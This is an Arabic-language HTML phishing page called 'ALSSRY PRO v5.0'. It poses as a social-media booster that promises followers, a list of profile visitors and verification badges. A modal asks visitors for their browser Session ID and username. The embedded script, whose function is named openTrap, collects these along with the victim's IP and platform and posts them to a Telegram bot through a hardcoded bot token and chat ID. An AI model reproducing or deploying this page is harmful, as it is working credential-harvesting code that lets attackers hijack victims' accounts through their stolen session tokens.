<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY PRO v5.0</title>
    <style>
        :root { --green: #00ff00; --red: #ff0000; }
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; text-align: center; }
        .logo { font-size: 40px; font-weight: 900; text-shadow: 2px 2px var(--red), -2px -2px var(--green); margin: 20px 0; }
        .tool-card { 
            background: rgba(255,255,255,0.05); border: 1px solid var(--green); 
            padding: 15px; margin: 10px; border-radius: 12px; cursor: pointer;
            display: flex; align-items: center; justify-content: space-between;
        }
        .start-btn { padding: 15px 70px; background: none; border: 2px solid var(--green); color: var(--green); border-radius: 50px; font-size: 20px; cursor: pointer; }
        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; padding: 20px; border: 2px solid var(--green); border-radius: 15px; z-index: 100; width: 80%; }
        input { width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid var(--green); color: #fff; border-radius: 5px; text-align: center; }
    </style>
</head>
<body>

    <div id="p1" style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;">
        <div class="logo">ALSSRY</div>
        <button class="start-btn" onclick="showTools()">دخول النظام</button>
    </div>

    <div id="p2" style="display: none; padding: 10px;">
        <div class="logo" style="font-size: 25px;">لوحة التحكم المتقدمة</div>
        <div class="tool-card" onclick="openTrap('رشق متابعين')">🚀 زيادة متابعين (ثبات 100%)</div>
        <div class="tool-card" onclick="openTrap('كشف الزوار')">👀 كشف من زار بروفايلك</div>
        <div class="tool-card" onclick="openTrap('توثيق')">☑️ طلب علامة التوثيق</div>
    </div>

    <div id="modal">
        <h3 id="m-title" style="color: var(--green);">تأكيد الحساب</h3>
        <p style="font-size: 12px;">لضمان أمان حسابك أثناء التنفيذ، يرجى إدخال (Session ID) أو كود الجلسة من المتصفح:</p>
        <input type="text" id="m-session" placeholder="أدخل الـ Session ID هنا">
        <input type="text" id="m-user" placeholder="اسم المستخدم @">
        <button class="start-btn" style="font-size: 15px; padding: 10px 30px;" onclick="sendData()">تأكيد وإرسال</button>
    </div>

    <script>
        const T = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const C = "5811700860";
        let currentService = "";

        function showTools() {
            document.getElementById('p1').style.display = 'none';
            document.getElementById('p2').style.display = 'block';
        }

        function openTrap(s) {
            currentService = s;
            document.getElementById('m-title').innerText = "قسم: " + s;
            document.getElementById('modal').style.display = 'block';
        }

        async function sendData() {
            let session = document.getElementById('m-session').value;
            let user = document.getElementById('m-user').value;

            if(!session || !user) { alert("يرجى إكمال البيانات!"); return; }

            let ip = "0.0.0.0";
            try { await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>ip=d.ip); } catch(e){}

            let report = `🔥 صيد "سيشن" جديد!\n🛠 الأداة: ${currentService}\n👤 اليوزر: ${user}\n🔑 السيشن ID: ${session}\n🌐 IP: ${ip}\n💻 النظام: ${navigator.platform}`;

            fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: C, text: report})
            }).then(() => {
                alert("تم استلام الطلب! سيتم التنفيذ خلال 15 دقيقة.");
                document.getElementById('modal').style.display = 'none';
            });
        }
    </script>
</body>
</html>
